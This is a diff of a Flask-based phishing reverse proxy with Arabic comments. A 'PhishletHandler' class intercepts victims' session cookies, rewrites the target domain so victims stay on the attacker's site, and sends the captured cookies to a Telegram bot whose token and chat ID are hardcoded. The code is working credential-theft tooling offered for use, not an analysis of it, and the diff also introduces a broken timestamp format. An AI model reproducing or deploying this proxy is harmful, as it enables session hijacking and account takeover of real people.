@@ -1,16 +1,13 @@
-from flask import Flask, request, 
-render_template, make_response, redirect, url_for
+from flask import Flask, request, render_template, make_response, redirect, url_for
 import requests
 import logging
 from urllib.parse import urlparse, urljoin, quote
-import ssl
 import json
 from datetime import datetime
 import os
-import re
 import urllib3
 
-# تعطيل تحذيرات SSL لضمان العمل بسلاسة خلف البروكسي
+# تعطيل تحذيرات SSL غير الآمنة لضمان العمل بسلاسة خلف البروكسي
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ======================== الإعدادات الخاصة بك ========================
@@ -18,9 +15,9 @@ TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8554468568:AAFvQJVSo6
 TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1367401179')
 # ====================================================================
 
+# تحديد مجلد القوالب لـ Flask لضمان عمل لوحة التحكم
 app = Flask(__name__, template_folder='templates')
 app.secret_key = os.urandom(24).hex()
-
 
 # إعداد التسجيل (Logging)
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
@@ -73,7 +70,7 @@ class PhishletHandler:
                 captured[cookie_name] = cookies_dict[cookie_name]
         
         if captured:
-            session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
+            session_id = datetime.now().strftime("%Y%m%d_%H%%S")
             session_data = {
                 'site': self.name,
                 'cookies': captured,
@@ -87,8 +84,8 @@ class PhishletHandler:
             message += f"🕒 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
             cookie_msg = "\n".join([f"  • `{k}`: `{v[:50]}...`" for k, v in captured.items()])
             message += f"🍪 **Cookies:**\n{cookie_msg}\n"
-            host_url = request.host_url.rstrip('/')
-            message += f"🔗 **View Full:** {host_url}/admin/session/{session_id}"
+            # تم تعديل هذا السطر: لا نستخدم request هنا
+            message += f"🔗 **View Full:** /admin/session/{session_id}"
             self.send_to_telegram(message)
             
             logging.info(f"Session captured: {session_id}")
@@ -111,7 +108,6 @@ class PhishletHandler:
                 if isinstance(content, bytes):
                     content = content.decode('utf-8', errors='ignore')
                 
-                # استبدال النطاق الأصلي بنطاق الوكيل لضمان بقاء الضحية في موقعنا
                 for proxy in self.proxy_hosts:
                     orig_domain = f"{proxy['orig_sub']}.{self.target_domain}" if proxy['orig_sub'] else self.target_domain
                     phish_domain = current_host
@@ -267,6 +263,6 @@ def proxy(path):
         return f"Error: {str(e)}", 500
 
 if __name__ == '__main__':
-    # المنفذ الافتراضي لـ Render
+    # المنفذ الافتراضي لـ Render (يُقرأ من متغير البيئة PORT أو 10000)
     port = int(os.environ.get('PORT', 10000))
     app.run(host='0.0.0.0', port=port)
